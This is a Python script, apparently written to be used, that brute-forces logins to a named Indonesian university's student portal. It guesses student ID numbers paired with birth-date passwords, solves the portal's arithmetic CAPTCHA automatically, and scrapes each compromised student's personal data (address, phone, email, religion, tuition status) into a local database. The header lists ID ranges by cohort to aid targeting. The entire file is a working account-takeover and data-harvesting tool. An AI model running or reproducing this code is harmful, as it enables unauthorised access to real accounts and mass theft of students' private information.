
"""
version 1.0 - 13-12-2024

Script ini digunakan untuk melakukan bruteforce website siakad,
dan juga Script ini dalam proses pengembangan algortima bruteforce lebih baik lagi dengan melakukan scraping dari PDDkti sebelum 
melakukan post ke website tersebut, 
Sebelum anda menggunakan Script ini pastikan anda harus memahami NIM UBSi 
Hint : 
Informatika 
Angkatan 2019 - Unknowing (Jika anda tau maka tambahakan sendiri)
Angkatan 2020 - 15200001 - 15200915 Index Tahun : 1998-2002
Angkatan 2021 - 15210001 - 15210915 Index Tahun : 1999 -2003
Angkatan 2022 - 15220001 - 15220915 Index Tahun : 2000 - 2004
Ankatan 2023  - 15230001 - 15220915 Index Tahun : 2001 - 2005 
Angkatan 2024 - 15240001 - 15240915 Index Tahun : 2002 - 2006 

Note : Index dan Nim ini mungkin tidak valid dan mungkin dapat terjadi kesalahan oleh karena itu sebaiknya anda dapat menangani kesalahan sendiri
melalui cek Nim di PDDikti dan juga Tahun Lahir yang tepat, semua kegagalan login akan ditambahkan pada tabel failed_login.



- Script bruteforce UBSI
@author william suherli


"""

import requests
import random
import re
import sqlite3
import json
from bs4 import BeautifulSoup
from datetime import date, timedelta, datetime

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

cookies = []
captcha_answer = None
tglLahir = None
final_url = None
DATABASE = '15230711-15230915.db'
TGL_OUTPUT = 'tanggal_output.txt'



""" Arsitektur ini berdiri secara independen bekerja secara berurutan , dan sedang di kembangkan untuk lebih baik """

def create_database():
    """
    Membuat atau memastikan tabel database SQLite tersedia (data_pribadi dan failedlogin).
    Menambahkan kolom tgl_scrape.
    """
    connection = sqlite3.connect(DATABASE)
    cursor = connection.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS data_pribadi (
            id INTEGER PRIMARY KEY AUTOINCREMENT,           
            nim TEXT,
            nama TEXT,
            tempat_lahir TEXT,
            tanggal_lahir DATE,
            alamat TEXT,
            kelurahan TEXT,
            kecamatan TEXT,
            kota TEXT,
            kode_pos TEXT,
            telepon TEXT,
            email TEXT,
            jenis_kelamin TEXT,
            agama TEXT,
            program_studi TEXT,
            tahun_masuk INTEGER,
            pilihan_waktu TEXT,
            lokasi_cabang TEXT,
            kelas TEXT,
            lokal TEXT,
            semester_aktif INTEGER,
            kondisi_aktif TEXT,
            kondisi_biaya_kuliah TEXT,
            data TEXT,
            tgl_scrape DATETIME  -- Menambahkan kolom tgl_scrape
        )
    ''')

    """ Tabel ini berfungsi untuk nim yang gagal Login dan anda dapat mengesekusi lebih lanjut 
    """
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS failedlogin (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            userID TEXT,
            tanggalstart DATE,
            tanggalend DATE
        )
    ''')

    connection.commit()
    connection.close()

def execute_query(query, data=None):
    """
    Eksekusi query SQLite dengan data yang diberikan.
    """
    try:
        connection = sqlite3.connect(DATABASE)
        cursor = connection.cursor()
        if data:
            cursor.execute(query, data)
        else:
            cursor.execute(query)
        connection.commit()
    except sqlite3.Error as e:
        print(f"Error: {e}")
    finally:
        connection.close()

def generate_random_cookie():
    """ Anda dapat menggenerate Cookies secara acak pada Halaman Dashboard sebelum anda mengirimkan data tersebut ke Halaman Login 
    """
    global cookies
    if cookies:
        return cookies
    else:
        random_number = random.randint(1, 20000)
        cookies.append(f"abcde{random_number};")
        print(f"Generate Successful your Cookies is {cookies[0]}")

def storeCookies():
    """ Fungsi ini berguna untuk mengirimkan data Cookies  Halaman pertama siakad 
    Agar cookies tersebut di simpan di dalam server UBSi, dan mengambil informasi Captcha 
    
    """
    global cookies
    global captcha_answer
    cokkies_store = f"PHPSESSID={cookies[0]}"
    headers = {
        "Host": "students.bsi.ac.id",
        "Cookie": cokkies_store,
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/57.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://students.bsi.ac.id/mahasiswa/update_data_pribadi_d3_88a9a8c3",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive",
    }

    url = "https://students.bsi.ac.id/mahasiswa/login_akd.aspx"
    try:
        print('melakukan pengiriman cookies...')
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Perbaikan: Handling jika captcha_text tidak ditemukan
        captcha_text = soup.find(string=re.compile(r"Berapa Hasil\s?\?"))
        if captcha_text:
            captcha_parent = captcha_text.find_parent()
            angka = [int(i) for i in captcha_parent.text.split() if i.isdigit()]
            hasil = sum(angka)
            captcha_answer = hasil
            print('melakukan login 1')
        else:
            print("Error: Captcha tidak ditemukan silahkan lihat struktur website")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def generate_date_range(min_date_str, max_date_str, filename=TGL_OUTPUT):
    """
    Menghasilkan rentang tanggal dan menyimpannya ke file TXT.

    Args:
        min_date_str: Tanggal awal (YYYY-MM-DD).
        max_date_str: Tanggal akhir (YYYY-MM-DD).
        filename: Nama file output (default: output_dates.txt).

    Returns:
        List of string tanggal atau pesan error.
    """
    try:
        min_date = date.fromisoformat(min_date_str)
        max_date = date.fromisoformat(max_date_str)

        if min_date > max_date:
            raise ValueError("Tanggal awal harus lebih kecil atau sama dengan tanggal akhir.")

        date_list = []
        current_date = min_date
        while current_date <= max_date:
            date_str = current_date.strftime("%Y-%m-%d")
            date_list.append(date_str)
            current_date += timedelta(days=1)

        with open(filename, "w") as f:
            for date_str in date_list:
                f.write(date_str + "\n")
                print(date_str)

        return date_list
    except ValueError as e:
        return f"Error: {e}"

def postLogin(user_id, password, min_date, max_date):

    """ Fungsi ini digunakan untuk mengirimkan data tersebut ke gateway Login dan mengirimkan sejumlah credential dari Nim dan tanggal Lahir"""
    global captcha_answer
    global cookies
    global tglLahir
    global final_url
    cokkies_postLogin = f"PHPSESSID={cookies[0]}"

    url = "https://students.bsi.ac.id/mahasiswa/login_akd.aspx"

    headers = {
        "Host": "students.bsi.ac.id",
        "Cookie": cokkies_postLogin,
        "Content-Length": "87",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://students.bsi.ac.id",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://students.bsi.ac.id/mahasiswa/login_akd.aspx",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive",
    }

    while True:
        data = {
            "txtUserID": user_id,
            "txtPassword": password,
            "program": "D3", #Sebagai default adalah D3 
            "captcha_answer": str(captcha_answer),
            "logincmd": "Login",
        }
        try:
            print(f'sedang mengirimkan data dengan password: {password}, User ID: {user_id}')
            response = requests.post(url, headers=headers, data=data, verify=False)

            if "CAPTCHA salah!" in response.text:
                print('captcha salah, mencoba lagi...')
                storeCookies()
                # Regenerate captcha_answer
                soup = BeautifulSoup(response.text, 'html.parser')
                captcha_text = soup.find(string=re.compile(r"Berapa Hasil\s?\?"))

                # Perbaikan: Handling jika captcha_text tidak ditemukan
                if captcha_text:
                    captcha_parent = captcha_text.find_parent()
                    angka = [int(i) for i in captcha_parent.text.split() if i.isdigit()]
                    captcha_answer = sum(angka)
                else:
                    print("Error: Captcha text not found during retry. Check the website structure.")
                    return False

                continue

            if "Maaf, user tidak ditemukan. Atau password Anda salah, Silahkan periksa kembali !" in response.text:
                print('user tidak ditemukan atau password salah, mencoba lagi dengan password berikutnya...')
                return False

            else:
                print('Login berhasil!')
                tglLahir = password
                soup = BeautifulSoup(response.text, 'html.parser')
                script_tag = soup.find('script', string=re.compile(r"document\.location\.href"))
                if script_tag:
                    match = re.search(r"document\.location\.href\s*=\s*['\"](\.[^'\"]+)['\"];", script_tag.string)
                    if match:
                        extracted_url = match.group(1)
                        final_url = extracted_url.split("./")[1]
                        print(f"Extracted and trimmed URL: {final_url}")
                        fetchPageDashboard(final_url=final_url, user_id=user_id)
                        return True
                    else:
                        print("URL tidak ditemukan dalam script tag.")
                else:
                    print("Script tag tidak ditemukan.")
                return False

        except requests.exceptions.RequestException as e:
            print("Error:", e)
            return False
        

def fetchPageDashboard(final_url, user_id):
    """
    Mengambil halaman dashboard setelah login berhasil, mengekstrak data mahasiswa,
    menyimpannya ke database SQLite (kolom 'data'), dan mengekstrak link pertama dari menu "Data Mahasiswa".
    """
    global cookies
    base_url = "https://students.bsi.ac.id/mahasiswa/"
    full_url = base_url + final_url
    cookies_fetchPageDashboard = {"PHPSESSID": cookies[0]}
    headers = {
        "Host": "students.bsi.ac.id",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "https://students.bsi.ac.id/mahasiswa/login_akd.aspx",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    try:
        response = requests.get(full_url, cookies=cookies_fetchPageDashboard, headers=headers, verify=False)
        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
        print("Halaman dashboard berhasil diambil!")
        print(f"Status code: {response.status_code}")

        soup = BeautifulSoup(response.text, 'html.parser')

        # Ekstrak data mahasiswa
        data_dashboard = {}
        form = soup.find('form', {'name': 'agreeform'})
        if form:
            tables = form.find_all('table')
            for table in tables:
                for row in table.find_all('tr'):
                    cols = row.find_all('td')
                    if len(cols) == 2:
                        key = cols[0].text.strip()
                        value_element = cols[1]

                        input_element = value_element.find('input')
                        select_element = value_element.find('select')

                        if input_element and input_element['type'] not in ('submit', 'checkbox'):
                            value = input_element.get('value', "")
                        elif select_element:
                            selected_option = select_element.find('option', selected=True)
                            value = selected_option.text if selected_option else ""
                        else:
                            value = value_element.text.strip()

                        data_dashboard[key] = value
        print("Data dari Dashboard:", data_dashboard)

        # Ekstrak link pertama dari menu "Data Mahasiswa"
        data_mahasiswa_div = soup.find('div', class_='menuheaders', string=re.compile(r"Data Mahasiswa"))
        if data_mahasiswa_div:
            menu_ul = data_mahasiswa_div.find_next_sibling('ul', class_='menucontents')
            if menu_ul:
                first_link = menu_ul.find('a')
                if first_link:
                    print("Elemen pertama dari Data Mahasiswa:")
                    href = first_link['href']
                    print("Href:", href)
                    fetch_and_parse(href, user_id, data_dashboard)
                else:
                    print("Tidak menemukan link pertama dalam menu Data Mahasiswa.")
            else:
                print("Tidak menemukan ul dengan class 'menucontents' setelah div Data Mahasiswa.")
        else:
            print("Tidak menemukan div dengan title 'Data Mahasiswa'.")

    except requests.exceptions.RequestException as e:
        print(f"Terjadi kesalahan saat mengambil halaman: {e}")




def is_nim_exist(nim):
    """
    Memeriksa apakah NIM sudah ada di database.
    """
    try:
        connection = sqlite3.connect(DATABASE)
        cursor = connection.cursor()

        cursor.execute("SELECT 1 FROM data_pribadi WHERE nim = ?", (nim,))
        result = cursor.fetchone()
        return result is not None

    except sqlite3.Error as e:
        print(f"Error: {e}")
        return False
    finally:
        connection.close()

def fetch_and_parse(href, user_id, data_dashboard):
    """
    Mengambil data dari URL, memparsir konten HTML,
    mengekstrak data dengan regex, menggabungkan dengan data dari dashboard,
    dan menyimpan hasilnya ke database (termasuk kolom 'data' dan 'tgl_scrape').
    """
    global cookies
    global tglLahir
    url = "https://students.bsi.ac.id/mahasiswa/"
    url_result = url + href
    cookies_fetch_and_parse = {"PHPSESSID": cookies[0]}
    headers = {
        "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36","Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer":
        "https://students.bsi.ac.id/mahasiswa/update_data_pribadi_d3_aeebfcac",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }

    try:
        response = requests.get(url_result, cookies=cookies_fetch_and_parse, headers=headers, verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        #print(soup.text) # Hapus untuk tampilan yang lebih bersih

        patterns = {
            "nim": r"N\s*I\s*M\s*:\s+([\d\s]+)",
            "nama": r"Nama\s*:\s*(.+)",
            "tempat_lahir": r"Tempat Lahir\s*:\s*(.+)",
            "tanggal_lahir": r"Tanggal\s*Lahir\s*:\s*(\d{4}-\d{2}-\d{2})",
            "alamat": r"Alamat\s*:\s*(.+)",
            "kelurahan": r"Kelurahan\s*:\s*(.+)",
            "kecamatan": r"Kecamatan\s*:\s*(.+)",
            "kota": r"Kota\s*:\s*(.+)",
            "kode_pos": r"Kode\s*Pos\s*:\s*(\d+)",
            "telepon": r"Telepon\s*:\s*(.+)",
            "email": r"E-mail\s*:\s*(.+)",
            "jenis_kelamin": r"Jenis\s*Kelamin\s*:\s*(.+)",
            "agama": r"Agama\s*:\s*(.+)",
            "program_studi": r"Program Studi\s*:\s*(.+)",
            "tahun_masuk": r"Tahun\s*Masuk\s*:\s*(\d+)",
            "pilihan_waktu": r"Pilihan Waktu\s*:\s*(.+)",
            "lokasi_cabang": r"Lokasi Cabang\s*:\s*(.+)",
            "kelas": r"Kelas\s*:\s*(.+)",
            "lokal": r"Lokal\s*:\s*(.+)",
            "semester_aktif": r"Semester\s*Aktif\s*:\s*(\d+)",
            "kondisi_aktif": r"Kondisi\s*Aktif\s*:\s*(.+)",
            "kondisi_biaya_kuliah": r"Kondisi\s*Biaya Kuliah\s*:\s*(.+)"
        }

        data_pribadi = {}

        for key, pattern in patterns.items():
            match = re.search(pattern, soup.text, re.IGNORECASE)
            if match:
                if key in ("tahun_masuk", "semester_aktif"):
                    data_pribadi[key] = int(match.group(1).strip())
                else:
                    data_pribadi[key] = match.group(1).strip()
            else:
                data_pribadi[key] = None

        print("Data dari fetch_and_parse:", data_pribadi)

        # Gabungkan data dari fetch_and_parse dan fetchPageDashboard
        # Pastikan NIM tidak di-overwrite jika sudah ada di data_dashboard
        if "nim" not in data_dashboard:
            data_dashboard["nim"] = data_pribadi.get("nim")

        # Gabungkan data
        data_pribadi.update(data_dashboard)

        if is_nim_exist(data_pribadi['nim']):
            print(f"NIM {data_pribadi['nim']} sudah ada di database. Data akan diupdate.")
            # Update data di database
            query = '''
                UPDATE data_pribadi 
                SET nama = :nama, 
                    tempat_lahir = :tempat_lahir, 
                    tanggal_lahir = :tanggal_lahir, 
                    alamat = :alamat, 
                    kelurahan = :kelurahan, 
                    kecamatan = :kecamatan, 
                    kota = :kota, 
                    kode_pos = :kode_pos, 
                    telepon = :telepon, 
                    email = :email, 
                    jenis_kelamin = :jenis_kelamin, 
                    agama = :agama, 
                    program_studi = :program_studi, 
                    tahun_masuk = :tahun_masuk, 
                    pilihan_waktu = :pilihan_waktu, 
                    lokasi_cabang = :lokasi_cabang, 
                    kelas = :kelas, 
                    lokal = :lokal, 
                    semester_aktif = :semester_aktif, 
                    kondisi_aktif = :kondisi_aktif, 
                    kondisi_biaya_kuliah = :kondisi_biaya_kuliah, 
                    data = :data, 
                    tgl_scrape = :tgl_scrape 
                WHERE nim = :nim
            '''
            # Konversi data_dashboard (yang sekarang sudah termasuk data_pribadi) menjadi JSON string
            data_json = json.dumps(data_dashboard, ensure_ascii=False)
            data_pribadi['data'] = data_json

            # Tambahkan tanggal scrape
            data_pribadi['tgl_scrape'] = datetime.now()

            execute_query(query, data_pribadi)
            print(f"Data untuk NIM {data_pribadi['nim']} berhasil diupdate.")
        else:
            # Sisipkan data baru ke database
            # Konversi data_dashboard (yang sekarang sudah termasuk data_pribadi) menjadi JSON string
            data_json = json.dumps(data_dashboard, ensure_ascii=False)
            data_pribadi['data'] = data_json

            # Tambahkan tanggal scrape
            data_pribadi['tgl_scrape'] = datetime.now()

            query = '''
                INSERT INTO data_pribadi (nim, nama, tempat_lahir, tanggal_lahir, alamat,
                    kelurahan, kecamatan, kota, kode_pos, telepon,
                    email, jenis_kelamin, agama, program_studi, tahun_masuk, pilihan_waktu,
                    lokasi_cabang, kelas, lokal, semester_aktif, kondisi_aktif, kondisi_biaya_kuliah, data, tgl_scrape)
                VALUES (:nim, :nama, :tempat_lahir, :tanggal_lahir, :alamat, :kelurahan,
                    :kecamatan, :kota, :kode_pos, :telepon, :email, :jenis_kelamin, :agama,
                    :program_studi, :tahun_masuk, :pilihan_waktu, :lokasi_cabang, :kelas,
                    :lokal, :semester_aktif, :kondisi_aktif, :kondisi_biaya_kuliah, :data, :tgl_scrape)
            '''
            execute_query(query, data_pribadi)
            print(f"Data untuk NIM {data_pribadi['nim']} berhasil disimpan.")

        # Hapus user_id dari failedlogin jika ada
        delete_from_failed_login(user_id) 

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def delete_from_failed_login(user_id):
    """
    Menghapus user_id dari tabel failedlogin.
    """
    try:
        connection = sqlite3.connect(DATABASE)
        cursor = connection.cursor()
        cursor.execute("DELETE FROM failedlogin WHERE userID = ?", (user_id,))
        connection.commit()
        print(f"User ID {user_id} dihapus dari failedlogin.")
    except sqlite3.Error as e:
        print(f"Error: {e}")
    finally:
        connection.close()

def insert_failed_login(user_id, min_date, max_date):
    """
    Menyimpan data login yang gagal ke tabel failedlogin.
    Jika NIM sudah ada, update tanggal awal dan akhir.
    """
    try:
        connection = sqlite3.connect(DATABASE)
        cursor = connection.cursor()

        print(min_date, max_date)

        # Periksa apakah NIM sudah ada di tabel failedlogin
        cursor.execute("SELECT 1 FROM failedlogin WHERE userID = ?", (user_id,))
        nim_exists = cursor.fetchone() is not None

        if nim_exists:
            # Update tanggal awal dan akhir
            query = '''
                UPDATE failedlogin 
                SET tanggalstart = ?, tanggalend = ? 
                WHERE userID = ?
            '''
            data = (min_date, max_date, user_id)
            cursor.execute(query, data)
            print(f"Data login gagal untuk User ID: {user_id} berhasil diupdate.")
        else:
            # Sisipkan data login gagal baru
            query = '''
                INSERT INTO failedlogin (userID, tanggalstart, tanggalend)
                VALUES (?, ?, ?)
            '''
            data = (user_id, min_date, max_date)
            cursor.execute(query, data)
            print(f"Data login gagal untuk User ID: {user_id} berhasil disimpan.")

        connection.commit()

    except sqlite3.Error as e:
        print(f"Error: {e}")
    finally:
        connection.close()

def get_last_nim(table_name):
    """
    Mendapatkan NIM terakhir (sebagai integer) dari tabel yang ditentukan.
    """
    try:
        connection = sqlite3.connect(DATABASE)
        cursor = connection.cursor()

        if table_name == "failedlogin":
            cursor.execute(f"SELECT MAX(CAST(userID AS INTEGER)) FROM {table_name}")
        else:
            cursor.execute(f"SELECT MAX(CAST(nim AS INTEGER)) FROM {table_name}")

        result = cursor.fetchone()[0]
        return int(result) if result else 0

    except sqlite3.Error as e:
        print(f"Error: {e}")
        return 0
    finally:
        connection.close()

def get_failed_nim_range():
    """
    Mendapatkan range NIM yang gagal dari tabel failedlogin.
    """
    try:
        connection = sqlite3.connect(DATABASE)
        cursor = connection.cursor()

        cursor.execute("SELECT userID FROM failedlogin ORDER BY CAST(userID AS INTEGER)")
        failed_nims = [int(row[0]) for row in cursor.fetchall()]
        return failed_nims

    except sqlite3.Error as e:
        print(f"Error: {e}")
        return []
    finally:
        connection.close()

if __name__ == '__main__':
    create_database()
    generate_random_cookie()
    min_date = "2002-01-01"
    max_date = "2005-12-12"
    date_range = generate_date_range(min_date, max_date, TGL_OUTPUT)
    if isinstance(date_range, list):
        print(f"Tanggal berhasil disimpan ke tanggal_output.txt")
    else:
        print(date_range)
    storeCookies()

    with open("tanggal_output.txt", "r") as f:
        passwords = f.read().splitlines()

    print("Pilih opsi:")
    print("1. Lanjutkan data yang failed")
    print("2. Lanjutkan berdasarkan NIM terakhir")
    print("3. Lanjutkan berdasarkan NIM di script")

    option = input("Masukkan pilihan (1/2/3): ")

    if option == '1':
        """ Opsi ini akan mengambil nim yang gagal dari database anda harus mendefinisikan 
        tanggal lahir sebelum melanjutkan """
        nim_list = get_failed_nim_range()
    elif option == '2':
        """ Opsi ini akan mengambil dari row terakhir dari setiap tabel datapribadi dan failed login dan membandingkan mana yang paling terakhir
         dan melanjutkan"""
        last_nim_data_pribadi = get_last_nim("data_pribadi")
        last_nim_failedlogin = get_last_nim("failedlogin")
        start_nim = max(last_nim_data_pribadi, last_nim_failedlogin) + 1
        nim_list = range(start_nim, 15230915) 
    elif option == '3':
        """ Script ini di defnisikan dari nim pertama hingga max nim terakhir yang berasal dari script
        misalkan anda mendefiniskan nim 15230711-15230915 maka anda harus mendefinisikan disini untuk pertama kali script dijalankan
        """
        nim_list = range(15230200, 15230915) 
    else:
        print("Opsi tidak valid.")
        exit()

    for user_id in nim_list:
        login_successful = False
        for password in passwords:
            success = postLogin(str(user_id), password, min_date, max_date)
            if success:
                print(f"Data berhasil disimpan untuk User ID: {user_id}")
                login_successful = True
                break
        if not login_successful:
            print(f"Login failed for all passwords for User ID: {user_id}")
            insert_failed_login(str(user_id), min_date, max_date)